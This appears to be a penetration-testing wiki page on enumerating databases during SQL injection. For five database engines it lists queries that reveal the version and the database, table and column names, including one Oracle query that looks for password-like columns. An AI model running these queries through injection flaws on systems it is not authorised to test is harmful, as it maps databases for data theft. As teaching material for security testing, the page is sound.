# Enum Database

## Theory

When exploiting SQL injection vulnerabilities, it is often necessary to gather some information about the database itself. This includes the type and version of the database software, and the contents of the database in terms of which tables and columns it contains. 

## Practice

{% hint style="info" %}
All queries on this page can be used with different techniques as UNION or Blind based attacks
{% endhint %}

### Database version 
Different databases provide different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.  
The queries to determine the database version for some popular database types are as follows:  

{% tabs %}
{% tab title="MySQL" %}
```sql
SELECT @@version 
```
{% endtab %}

{% tab title="MSSQL" %}
```sql
SELECT @@version 
```
{% endtab %}

{% tab title="OracleSQL" %}
```sql
SELECT banner FROM v$version
```
{% endtab %}

{% tab title="PostgreSQL" %}
```sql
SELECT version() 
```
{% endtab %}

{% tab title="SQLite" %}
```sql
SELECT sqlite_version();
```
{% endtab %}
{% endtabs %}

### Database Names 
When performing SQL injections, it can be useful to know the names of the databases that are present on the targeted server. Enumerating the database names allows you to identify which databases are available and potentially gain insight into the server's configuration and architecture. This information can be used to craft more targeted and effective SQL injection attacks. 

{% tabs %}
{% tab title="MySQL" %}
We can enum the current database with the following query:
```sql
SELECT database();
```
We can list all databases with the following query:
```sql
SELECT schema_name FROM information_schema.schemata;
```
{% endtab %}

{% tab title="MSSQL" %}
We can enum the current database with the following query:
```sql
SELECT DB_NAME();
```
We can list all databases with the following queries:
```sql
SELECT name FROM master..sysdatabases;
/*or*/
SELECT DB_NAME(N); — for N = 0, 1, 2, …
```
{% endtab %}

{% tab title="OracleSQL" %}
We can enum the current database with the following queries:
```sql
SELECT global_name FROM global_name;
SELECT name FROM V$DATABASE;
SELECT instance_name FROM V$INSTANCE;
SELECT SYS.DATABASE_NAME FROM DUAL;
```
We can list all databases with the following query:
```sql
SELECT DISTINCT owner FROM all_tables;
```
{% endtab %}

{% tab title="PostgreSQL" %}
We can enum the current database with the following query:
```sql
SELECT current_database();
```
We can list all databases with the following query:
```sql
SELECT datname FROM pg_database;
```
{% endtab %}

{% tab title="SQLite" %}
We can extract database structure with the following query
```sql
SELECT sql FROM sqlite_schema;
```
{% endtab %}
{% endtabs %}

### Tables Names 
The next step in performing SQL injections is to enumerate the tables that are present within each database. Enumerating the table names can provide valuable information about the structure and content of the databases.  

{% tabs %}
{% tab title="MySQL" %}
```sql
SELECT table_name FROM information_schema.tables;
SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE();
```
{% endtab %}

{% tab title="MSSQL" %}
```sql
SELECT table_name FROM information_schema.tables;
SELECT table_name FROM information_schema.tables WHERE table_catalog = DB_NAME();
```
{% endtab %}

{% tab title="OracleSQL" %}
```sql
SELECT table_name FROM all_tables;
SELECT table_name FROM all_tables WHERE owner = USER;

SELECT owner, table_name FROM all_tables;
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
```
{% endtab %}

{% tab title="PostgreSQL" %}
```sql
SELECT table_name FROM information_schema.tables;
SELECT table_name FROM information_schema.tables WHERE table_schema = current_schema();
```
{% endtab %}

{% tab title="SQLite" %}
```sql
SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';
```
{% endtab %}
{% endtabs %}

### Columns Names 
Next step is to enumerate columns within tables.It's a crucial step in the process of exploiting a SQL injection vulnerability.

{% tabs %}
{% tab title="MySQL" %}
```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE';
```
{% endtab %}

{% tab title="MSSQL" %}
```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE';
```
{% endtab %}

{% tab title="OracleSQL" %}
```sql
SELECT column_name FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE';
```
{% endtab %}

{% tab title="PostgreSQL" %}
```sql
SELECT column_name FROM information_schema.columns WHERE table_name='TABLE-NAME-HERE';
```
{% endtab %}

{% tab title="SQLite" %}
```sql
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name';
```
{% endtab %}
{% endtabs %}


## Resources

{% embed url="https://portswigger.net/web-security/sql-injection" %}
{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" %}
